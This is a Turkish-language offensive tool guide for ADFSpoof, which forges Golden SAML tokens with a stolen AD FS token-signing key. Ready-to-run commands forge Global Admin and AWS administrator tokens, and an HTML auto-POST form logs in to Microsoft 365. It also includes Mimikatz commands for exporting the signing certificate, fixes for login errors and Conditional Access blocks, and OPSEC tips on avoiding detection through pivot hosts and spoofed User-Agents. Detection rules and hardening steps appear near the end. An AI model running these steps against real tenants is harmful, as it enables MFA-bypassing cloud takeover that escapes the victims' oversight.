# ADFSpoof (Golden SAML)

> **Kategori:** [14. AD FS, Bulut ve Hibrit Kimlik](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Ele geçirilen AD FS Token-Signing özel anahtarını ve sertifikasını kullanarak, şirket içi sunuculara ihtiyaç duymaksızın herhangi bir kullanıcı adına sahte SAML 2.0 / 1.1 belirteçleri (Golden SAML) üreten ve bulutta parola/MFA olmaksızın oturum açan Python aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory Federation Services (AD FS), şirket içi Active Directory kimliklerini harici bulut sağlayıcılarına (Microsoft 365, Azure AD / Entra ID, Amazon Web Services - AWS, Salesforce, Google Workspace vb.) tekil oturum açma (SSO) ile bağlayan federe kimlik doğrulama servisidir. Bu mimaride bulut servis sağlayıcısı (Service Provider - SP), kullanıcının parolasını veya kimlik doğrulama detaylarını doğrudan bilmez; bunun yerine AD FS (Identity Provider - IdP) tarafından kriptografik olarak imzalanmış bir **SAML Yanıtına (SAML Assertion / Token)** güvenir.

Bu güven ilişkisinin kriptografik temelini, AD FS sunucusunda barındırılan **Token-Signing Sertifikası ve Özel Anahtarı (Private Key)** oluşturur. 

CyberArk araştırmacıları tarafından ortaya konan ve SolarWinds (Nobelium / APT29) siber casusluk operasyonunda küresel ölçekte kullanılan **Golden SAML** saldırısı, Kerberos dünyasındaki Golden Ticket kavramının bulut karşılığıdır. Bir saldırgan AD FS sunucusunu ele geçirerek veya yedeklerden Token-Signing özel anahtarını (`.pfx` dosyası veya CNG/DPAPI blobu olarak) çaldığında, artık çalışan bir AD FS sunucusuna dahi ihtiyaç duymaz. Kendi çevrimdışı makinesinde bu özel anahtarla istediği kullanıcının (CEO, Global Administrator, AWS Root) kimlik bilgilerini ve yetkilerini içeren sahte bir SAML belirteci üretebilir.

**ADFSpoof** (Doug Bienstock / @doughsec tarafından geliştirilmiştir), bu Golden SAML sürecini otomatikleştiren Python tabanlı bir istismar aracıdır. Araç, sağlanan PFX sertifikasıyla XMLDSig (XML Digital Signature) standartlarına birebir uygun sahte SAML token'ları oluşturur. Üretilen bu token ile:
* Kullanıcının parolası bilinmeden,
* Kullanıcının parolası değiştirilmiş olsa dahi,
* **Tüm Çok Faktörlü Kimlik Doğrulama (MFA) kontrolleri atlatılarak**
doğrudan bulut ortamına sızılabilir ve şirket içi AD FS sunucusunda **sıfır işlem kaydı (Zero On-Premises Logs)** bırakılır.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                            GÖLDEN SAML MIMARI AKIŞI                               |
+-----------------------------------------------------------------------------------+
  [Saldırgan İstasyonu]                              [Bulut Sağlayıcısı (Entra ID / AWS)]
      (ADFSpoof.py)                                     (SAML Service Provider)
            |                                                     |
  [Çalınan PFX Sertifikası]                                       |
  (Token-Signing Private Key)                                     |
            |                                                     |
            |--- 1. Sahte SAML Assertion Üretilir                |
            |       - Subject: GlobalAdmin@corp.com               |
            |       - ImmutableID: a9128f441029384756...          |
            |       - AuthenticationMethod: Password, MFA (Sahte) |
            |                                                     |
            |--- 2. Çalınan Özel Anahtar ile İmzalanır            |
            |       (XMLDSig / SHA256 İmzası Basılır)             |
            |                                                     |
            |--- 3. Base64 SAMLResponse Oluşturulur               |
            |                                                     |
            |--- 4. HTTPS POST /login.srf (Port 443) ------------>|--- 5. Bulut SP İmzayı
            |       [SAMLResponse=<Base64_Payload>]               |       Doğrular:
            |                                                     |       İmza = AD FS Sertifikası
            |<-- 6. HTTP 302 / Oturum Çerezi (ESTSAUTH) ----------|       (İmza Geçerli Onayı!)
            |                                                     |
            v                                                     v
  [ON-PREM AD FS'E HİÇ DOKUNULMADI!] -> [Bulutta Parolasız & MFA'sız Global Admin Erişimi!]
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Saldırılara Üstünlüğü |
| :--- | :--- | :--- |
| **MFA'yı Tamamen Baypas Eder** | SAML iddiasında MFA yapıldı olarak işaretlenir. | En katı FIDO2 / Push MFA kurallarını bile bertaraf eder. |
| **Parola Bağımsızlığı** | Kullanıcı parolasını değiştirse bile token çalışır. | Kalıcı ve bozulmaz bir bulut erişim kapısı sunar. |
| **Sıfır Şirket İçi İz** | Token saldırganın Linux makinesinde üretilir. | On-premises AD FS ve DC sunucularında hiçbir log oluşmaz. |
| **Çoklu Bulut Desteği** | Hem Microsoft 365 / Azure AD hem AWS'yi destekler. | Tek bir çalınan anahtarla tüm kurumsal buluta erişim açar. |
| **İstenen Kullanıcıyı Taklit** | Tek bir komutla herhangi bir UPN adına bilet basar.| Ayrı ayrı kullanıcı hesaplarını ele geçirme ihtiyacını kaldırır. |

### Karşılaştırma Tablosu

| Özellik | ADFSpoof (Golden SAML) | Golden Ticket (Kerberos) | Silver Ticket (Kerberos) | AADInternals (SAML) |
| :--- | :--- | :--- | :--- | :--- |
| **Hedef Ortam** | Bulut (M365, AWS, Entra ID) | Şirket İçi Active Directory | Şirket İçi Tekil Servis | Şirket İçi & Bulut Hibrit |
| **Gereken Anahtar** | AD FS Token-Signing PFX | `krbtgt` NTLM / AES Anahtarı | Servis Hesabı NTLM/AES | Token-Signing PFX / AADC |
| **Protokol** | SAML 1.1 / 2.0 (XMLDSig) | Kerberos TGT (RC4/AES) | Kerberos TGS (RC4/AES) | SAML & WS-Trust / Graph |
| **MFA Etkisi** | MFA'yı tamamen atlatır | MFA şirket içi ise atlatır | MFA etkisiz | MFA'yı atlatır |
| **Platform** | Python CLI (Bağımsız) | Mimikatz / Rubeus (Windows) | Mimikatz / Rubeus | PowerShell Modülü |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

ADFSpoof komut satırından PFX dosya yolu, şifresi, hedef bulut servis sağlayıcısı (SP) ve taklit edilecek kullanıcı parametreleriyle çağrılır:

```bash
python3 ADFSpoof.py -c <PFX_YOLU> -p <PFX_PAROLASI> -s <SP_ENTITY_ID> -u <UPN> [SEÇENEKLER]
```

### Desteklenen Kritik Bayraklar

| Parametre | Uzun Adı | Açıklama | Örnek Değer |
| :--- | :--- | :--- | :--- |
| `-c` | `--cert` | Çalınan Token-Signing sertifikasının PFX dosya yolu. | `-c adfs_signing.pfx` |
| `-p` | `--password` | PFX özel anahtarını koruyan parola (Yoksa boş geçilir). | `-p 'CertPassword123!'` |
| `-s` | `--sp` | Hedef Servis Sağlayıcının Entity ID değeri. | `-s urn:federation:MicrosoftOnline` |
| `-u` | `--upn` | Taklit edilecek hedef kullanıcının UserPrincipalName değeri. | `-u admin@corp.com` |
| `-i` | `--immutableid` | Azure AD kullanıcısının Base64 kodlu kaynak bağlantı (SourceAnchor) değeri. | `-i "m9812401284=="` |
| `-r` | `--role` | AWS için atanacak federe IAM Rolü ve SAML Provider ARN değeri. | `-r arn:aws:iam::123:role/Admin,...` |
| `--issuer` | `--issuer` | AD FS sunucusunun resmi IdP Federation Service Identifier URL'i. | `--issuer http://adfs.corp.com/adfs/services/trust` |
| `--lifetime` | `--lifetime` | Üretilen SAML belirtecinin geçerlilik süresi (Dakika cinsinden). | `--lifetime 60` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Microsoft 365 / Azure AD için Sahte SAML Token Üretme
Çalınan AD FS imzalama sertifikası ile Global Administrator hesabı adına geçerli bir SAML 1.1 / 2.0 belirteci basma:

```bash
python3 ADFSpoof.py -c token_signing.pfx -p 'Pass123!' \
  -s "urn:federation:MicrosoftOnline" \
  --issuer "http://adfs.corp.local/adfs/services/trust" \
  -u "globaladmin@corp.com" \
  -i "bW9zb2xfaW1tdXRhYmxl==" \
  --lifetime 120
```

**Konsol Çıktı Analizi:**
```
[+] ADFSpoof - Golden SAML Token Generation Tool
[*] Loading Token-Signing Private Key from: token_signing.pfx
[+] Private key and X.509 certificate loaded successfully!
[*] Building SAML 2.0 Assertion for: globaladmin@corp.com
[*] Setting ImmutableID: bW9zb2xfaW1tdXRhYmxl==
[*] Adding Claims: InsideCorporateNetwork=True, MFA=Completed
[*] Signing assertion with RSA-SHA256 and canonicalizing XML...
[+] SAML Assertion generated and signed successfully!

[+] Base64 SAMLResponse:
PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPS...
```

### Senaryo 2: AWS Federe Konsol Erişimi için SAML Assertion Üretme
Kurumsal AWS hesabına doğrudan AdministratorAccess rolüyle konsol erişimi sağlamak için AWS SAML token'ı oluşturma:

```bash
python3 ADFSpoof.py -c token_signing.pfx -p 'Pass123!' \
  -s "https://signin.aws.amazon.com/saml" \
  --issuer "http://adfs.corp.local/adfs/services/trust" \
  -u "cloudops@corp.com" \
  -r "arn:aws:iam::123456789012:role/ADFS-Admin,arn:aws:iam::123456789012:saml-provider/ADFS"
```

**Konsol Çıktı Analizi:**
```
[*] Building SAML Assertion for AWS Federation...
[*] Adding AWS Role Attribute: arn:aws:iam::123456789012:role/ADFS-Admin
[*] Signing assertion...
[+] Base64 SAMLResponse generated!
[*] POST this payload to: https://signin.aws.amazon.com/saml to assume role!
```

### Senaryo 3: Parolasız PFX Dosyası ile Hızlı İmzalanmış Token Basma
Bellekten şifresiz çıkarılmış PFX dosyası ile argümansız hızlı üretim:

```bash
python3 ADFSpoof.py -c exported_cert.pfx -s "urn:federation:MicrosoftOnline" \
  --issuer "http://adfs.corp.local/adfs/services/trust" \
  -u "cfo@corp.com" -i "Y2ZvX2lkXzIwMjY="
```

**Konsol Çıktı Analizi:**
```
[*] No PFX password supplied, attempting blank password...
[+] Private key successfully extracted.
[+] SAML Response ready for transmission.
```

### Senaryo 4: Üretilen SAMLResponse ile Tarayıcı Üzerinden Bulut Oturumu Açma
Elde edilen Base64 kodlu SAMLResponse yükünü curl veya tarayıcı konsolu üzerinden doğrudan Microsoft oturum açma uç noktasına gönderme:

```html
<!-- HTML Otomatik POST Şablonu (test_login.html) -->
<form method="POST" action="https://login.microsoftonline.com/login.srf">
    <input type="hidden" name="SAMLResponse" value="PHNhbWxwOlJlc3BvbnNlIHhtbG5z..." />
    <input type="submit" value="Bulutta Oturum Aç" />
</form>
```

**Tarayıcı Davranış Analizi:**
```
1. Kullanıcı butona basar (veya form otomatik post edilir).
2. https://login.microsoftonline.com/login.srf isteği alır.
3. Microsoft Entra ID imzayı AD FS Token-Signing sertifikası ile doğrular.
4. Başarılı: Parola ve MFA sorulmadan doğrudan portal.office.com ana sayfasına yönlendirilir!
```

### Senaryo 5: Mimikatz ile AD FS PFX Sertifikası Çıkarma ve ADFSpoof'a Hazırlama
AD FS sunucusunda yerel yönetici yetkisiyle Token-Signing sertifikasını dışa aktarma:

```
privilege::debug
crypto::cng
crypto::certificates /export
```

**Mimikatz Çıktı Analizi:**
```
Exporting certificate: CN=ADFS Signing - adfs.corp.local
File: CERTIFICATE_CURRENT_USER_MY_1_CN=ADFS Signing - adfs.corp.local.pfx
Password: mimikatz
```

Elde edilen dosya doğrudan ADFSpoof'a girdi olarak verilir:

```bash
python3 ADFSpoof.py -c "CERTIFICATE_CURRENT_USER_MY_1_CN=ADFS Signing - adfs.corp.local.pfx" -p "mimikatz" ...
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `AADSTS50008: SAML token is invalid or signature verification failed` | SAML yanıtını imzalayan sertifika, bulutta kayıtlı AD FS Token-Signing sertifikası ile eşleşmiyor (Örn: Token-Decrypt sertifikası kullanılmış). | Çıkarılan sertifikanın Token-Signing sertifikası olduğunu teyit edin; `Get-AdfsCertificate -CertificateType Token-Signing` ile thumbprint değerini karşılaştırın. |
| `AADSTS50107: The requested federation realm object does not exist` | `--issuer` parametresine girilen URL, Azure AD'deki federasyon Identifier değeri ile tam eşleşmiyor. | `Get-AADIntTenantDomains -Domain corp.com` ile kiracıdaki resmi `FederationServiceIdentifier` URL'ini bulun ve harfiyen aynı yazın. |
| `AADSTS50012: Invalid ImmutableId / User not found` | Token içerisindeki `ImmutableId` değeri kullanıcının Azure AD nesnesindeki `onPremisesSourceAnchor` değeriyle uyuşmuyor. | Şirket içi AD'den kullanıcının `objectGUID` değerini alıp Base64 formatına dönüştürün ve `-i` parametresine verin. |
| `OpenSSL::PKCS12 error: mac verify failure` | PFX dosyasının şifresi yanlış girilmiş veya dosya aktarımı sırasında bozulmuş. | Mimikatz veya PowerShell ile PFX dosyasını bilinen basit bir parola (`-Password 'P@ss'`) ile yeniden dışa aktarın. |
| `AADSTS50058: A silent sign-in request was sent but no user is signed in` | SAML assertion geçerlilik süresi dolmuş veya istemci sistem saati ile Microsoft bulut saati arasında 5 dakikadan fazla fark var. | Sistem saatinizi NTP ile senkronize edin; `--lifetime 120` ile token ömrünü uzatın. |
| `Conditional Access Policy: Access blocked due to device compliance` | Bulut ortamında Microsoft Intune veya Entra ID uyumlu cihaz zorunluluğu politikası var. | Güvenilen şirket içi IP adresleri üzerinden proxy/VPN kullanarak çıkış yapın veya cihaz uyumluluğu zorunlu olmayan API'lere bağlanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: DÜŞÜK]
0 ----[3.0 - OFFLINE TOKEN FORGERY]-------------------------- 10
  - Şirket İçi Seviye: SIFIR LOG! (Token saldırganın kendi makinesinde çevrimdışı üretilir)
  - Bulut Seviyesi: Azure AD Sign-in Logs telemetrisi (IP ve User-Agent uyumsuzluğu)
```

> [!IMPORTANT]
> **Adli Görünmezlik:** Golden SAML saldırısı, şirket içi AD FS altyapısında veya etki alanı denetleyicilerinde hiçbir ağ trafiği, RPC çağrısı veya Windows Güvenlik Olayı üretmez. Bu nedenle şirket içi SIEM ve EDR çözümleri bu saldırıyı doğrudan tespit edemez; tüm tespit bulut telemetrisi üzerinden yapılmalıdır.

### 5.1 Bırakılan İzler (Event Logs)

* **Şirket İçi AD FS Sunucusu (Event Logs):**
  * **Sıfır Günlük:** AD FS sunucusuna hiçbir istek gitmediği için Event ID 1200 veya 1202 olayları oluşmaz.
* **Entra ID / Azure AD Sign-in Logs:**
  * **Authentication Method:** `Federated` (SAML) olarak kaydedilir.
  * **ClaimsProvider:** Kurumsal AD FS IdP adı görünür.
  * **MFA Kaydı:** SAML içinde `InsideCorporateNetwork=True` ve `MFA=Satisfied` iddiası yer aldığından, bulut MFA'yı başarılı sayar.
  * **Anomali Alanları:** Kullanıcının daha önce hiç oturum açmadığı olağandışı bir dış IP adresi, bilinmeyen ASN/Servis Sağlayıcı veya standart dışı bir tarayıcı User-Agent dizesi.

### 5.2 Ağ ve EDR İmzaları

* **Şirket İçi Ağ:**
  Saldırı esnasında şirket içi ağda hiçbir paket akışı bulunmaz.
* **Bulut Ağ Trafiği:**
  Saldırganın makinesinden doğrudan Microsoft uç noktasına (`https://login.microsoftonline.com/login.srf`) yapılan tek bir HTTPS POST isteği.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1606.002` | Forge Web Credentials: Golden SAML | Sahte SAML assertion üreterek kimlik taklidi yapma. |
| **Credential Access** | `T1552.004` | Unsecured Credentials: Private Keys | AD FS Token-Signing özel anahtarını çalma. |
| **Defense Evasion** | `T1078.004` | Valid Accounts: Cloud Accounts | Bulut hesaplarına parola ve MFA olmadan erişim. |
| **Lateral Movement** | `T1556.007` | Hybrid Identity Pivot | Şirket içi AD FS'ten bulut ortamına sıçrama. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **Bilinmeyen Çıkış IP'si** | Sahte SAML token, doğrudan saldırgan IP'sinden değil; şirket içi güvenilen ağa ait bir pivot host üzerinden POST edilmelidir. |
| **User-Agent İmzası** | Python veya curl User-Agent'ı yerine hedef yöneticinin kullandığı standart kurumsal tarayıcı başlığı (`Chrome / Windows 10`) taklit edilmelidir. |
| **Özel Anahtar Güvenliği** | Çalınan PFX anahtarı hiçbir koşulda internete açık sunucularda saklanmamalı; şifreli disklerde tutulmalıdır. |
| **Token Süresi** | Şüphe uyandırmamak için `--lifetime` süresi normal AD FS ömrü olan 60 dakikada tutulmalıdır. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: Bulut Günlüklerinde Olası Golden SAML Oturum Açma Tespiti
```yaml
title: Entra ID / Azure AD Supheli Golden SAML Oturumu
id: c9812402-4412-4f88-b112-998811aa3344
status: experimental
description: Sirket ici AD FS sunucusunda karsiligi olmayan federe SAML oturumlarini bulut sign-in loglarindan yakalar.
references:
    - https://attack.mitre.org/techniques/T1606/002/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    service: azure_signin
    product: azure
detection:
    selection:
        AuthenticationMethod: 'Federated'
        RiskLevelDuringSignIn in:
            - 'high'
            - 'medium'
    condition: selection
falsepositives:
    - Seyahat eden veya yeni cihazdan giris yapan mesru yoneticiler.
level: high
tags:
    - attack.credential_access
    - attack.t1606.002
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// Sirket ici AD FS event loglari ile Azure AD federe sign-in loglarini eslestirerek Golden SAML tespiti yapar
SigninLogs
| where TimeGenerated >= ago(24h)
| where AuthenticationType == "Federated"
| where ResultType == 0 // Basarili girisler
| project TimeGenerated, UserPrincipalName, IPAddress, Location, UserAgent, ResourceDisplayName
// Bu loglar sirket ici AD FS Event ID 1200 loglari ile karsilastirildiginda, AD FS'te kaydi olmayanlar Golden SAML'dir!
```

#### YARA Kuralı: ADFSpoof Script İmzası
```yara
rule Threat_Script_ADFSpoof_GoldenSAML {
    meta:
        description = "ADFSpoof Golden SAML sahtecilik betigini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "ADFSpoof" ascii wide nocase
        $s2 = "Token-Signing" ascii wide
        $s3 = "urn:federation:MicrosoftOnline" ascii wide
        $s4 = "ImmutableID" ascii wide
        $s5 = "saml:Assertion" ascii wide
    condition:
        all of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **Token-Signing Anahtarlarını Donanımda Saklama (HSM):** AD FS sunucusundaki imzalama anahtarları yazılımsal depolama yerine FIPS uyumlu bir Donanımsal Güvenlik Modülü (HSM) veya sanal TPM (vTPM) içerisinde barındırılmalı; dışa aktarılması (`exportable`) yasaklanmalıdır.
2. **Sertifika Rotasyonu (Rotation):** Şüpheli bir ihlal durumunda AD FS üzerindeki Token-Signing sertifikaları derhal iptal edilmeli, yenilenmeli ve yeni genel anahtar Azure AD / Entra ID tarafına güncellenmelidir.
3. **Federe Yapıdan Bulut Doğrulamasına Geçiş (PHS):** Karmaşık ve sömürüye açık AD FS mimarisi terk edilmeli; Microsoft'un önerdiği Password Hash Sync (PHS) ve bulut yerel Parolasız (FIDO2) kimlik doğrulamasına geçilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. M365 İçin Standart Golden SAML Üretimi
```bash
python3 ADFSpoof.py -c signing.pfx -p 'Pass123' -s "urn:federation:MicrosoftOnline" --issuer "http://adfs.corp.com/adfs/services/trust" -u "admin@corp.com" -i "BASE64_ID"
```
* **Ne Yapar?:** Microsoft 365 için imzalanmış geçerli bir Golden SAML token dizesi üretir.
* **Ne Zaman Kullanılır?:** Çalınan AD FS sertifikası ile bulut yöneticisi hesabına sızmak için.
* **Parametreler:** `-c` sertifika, `-s` Microsoft Online urn, `-u` UPN, `-i` ImmutableID.

#### 2. AWS İçin Rol Tabanlı SAML Üretimi
```bash
python3 ADFSpoof.py -c signing.pfx -p 'Pass123' -s "https://signin.aws.amazon.com/saml" --issuer "http://adfs.corp.com/adfs/services/trust" -u "devops@corp.com" -r "ROLE_ARN,PROVIDER_ARN"
```
* **Ne Yapar?:** AWS IAM rolünü üstlenmek (AssumeRoleWithSAML) için imzalı SAML token üretir.
* **Ne Zaman Kullanılır?:** Kurumsal AWS bulut hesaplarına konsol erişimi sağlamak için.
* **Parametreler:** `-r` AWS Role ve Provider ARN çifti.

#### 3. Parolasız PFX ile Token İmzalamak
```bash
python3 ADFSpoof.py -c exported.pfx -s "urn:federation:MicrosoftOnline" --issuer "http://adfs.corp.com/adfs/services/trust" -u "user@corp.com" -i "BASE64_ID"
```
* **Ne Yapar?:** Şifresiz PFX dosyasını kullanarak doğrudan token üretir.
* **Ne Zaman Kullanılır?:** Bellekten şifresiz ayıklanan sertifikalarda.
* **Parametreler:** `-p` parametresi verilmez.

#### 4. Özel Issuer (IdP) URL Tanımlama
```bash
python3 ADFSpoof.py ... --issuer "http://fs.company.com/adfs/services/trust"
```
* **Ne Yapar?:** AD FS sunucusunun etki alanındaki resmi tanımlayıcı adresini belirtir.
* **Ne Zaman Kullanılır?:** Servis sağlayıcının imza doğrulaması yapabilmesi için zorunludur.
* **Parametreler:** `--issuer <URL>`.

#### 5. 24 Saatlik Uzatılmış Ömürlü Token Basma
```bash
python3 ADFSpoof.py ... --lifetime 1440
```
* **Ne Yapar?:** Token'ın geçerlilik süresini 1 gün (1440 dakika) olarak ayarlar.
* **Ne Zaman Kullanılır?:** Uzun süreli bulut operasyonlarında sürekli yeni token üretmemek için.
* **Parametreler:** `--lifetime <Dakika>`.

#### 6. Base64 SAMLResponse Çıktısını Dosyaya Yazma
```bash
python3 ADFSpoof.py ... > /tmp/saml_token.txt
```
* **Ne Yapar?:** Üretilen Base64 SAML yükünü metin dosyasına kaydeder.
* **Ne Zaman Kullanılır?:** Tarayıcı veya otomasyon script'lerine beslemek için.
* **Parametreler:** Standart Linux yönlendirmesi.

#### 7. Mimikatz ile AD FS PFX Sertifikası Çıkarma
```
crypto::cng; crypto::certificates /export
```
* **Ne Yapar?:** AD FS sunucusunun belleğinden Token-Signing sertifikasını şifresiyle diske döker.
* **Ne Zaman Kullanılır?:** ADFSpoof için gereken PFX dosyasını temin etmek için.
* **Parametreler:** Mimikatz konsol komutları.

#### 8. Token-Signing Sertifikasının Parmak İzini Doğrulama
```powershell
Get-AdfsCertificate -CertificateType Token-Signing | Select-Object CertificateType, Thumbprint
```
* **Ne Yapar?:** AD FS sunucusunda aktif olan imzalama sertifikasının parmak izini verir.
* **Ne Zaman Kullanılır?:** Çalınan sertifikanın doğru sertifika olduğunu teyit etmek için.
* **Parametreler:** AD FS yerleşik PowerShell modülü.

#### 9. ImmutableId Değerini Doğrulama
```powershell
Get-ADUser -Identity "admin" | Select-Object @{N="ImmutableId";E={[Convert]::ToBase64String($_.objectGUID.ToByteArray())}}
```
* **Ne Yapar?:** Kullanıcının AD FS / Azure AD eşleşmesinde kullanılan `ImmutableId` değerini üretir.
* **Ne Zaman Kullanılır?:** Token içerisine doğru kullanıcı kimliğini yerleştirmek için.
* **Parametreler:** PowerShell `Get-ADUser`.

#### 10. Çevrimdışı PFX Dosyalarını Güvenle İmha Etme
```bash
shred -u -z -n 3 /tmp/*.pfx
```
* **Ne Yapar?:** Hasat edilen özel anahtar dosyalarını diskten güvenle siler.
* **Ne Zaman Kullanılır?:** Operasyon tamamlandığında kritik kriptografik verileri yok etmek için.
* **Parametreler:** `shred -u -z -n 3`.

---

## Kaynaklar
* [ADFSpoof Resmi GitHub Deposu (Doug Bienstock)](https://github.com/doughsec/AdfsSpoof)
* [CyberArk Araştırması: Golden SAML - Newly Discovered Attack Technique](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forbids-access-to-all-hybrid-cloud-environments)
* [CISA Güvenlik Uyarısı: Mitigating Attacks Against Active Directory Federation Services](https://www.cisa.gov/)
* [MITRE ATT&CK: Forge Web Credentials: Golden SAML (T1606.002)](https://attack.mitre.org/techniques/T1606/002/)
* [HackTricks: Golden SAML](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-saml)

---

> **Önceki:** [← AADInternals](./AADInternals.md) · **Sonraki:** [ROADtools / roadrecon →](./ROADtools_roadrecon.md)
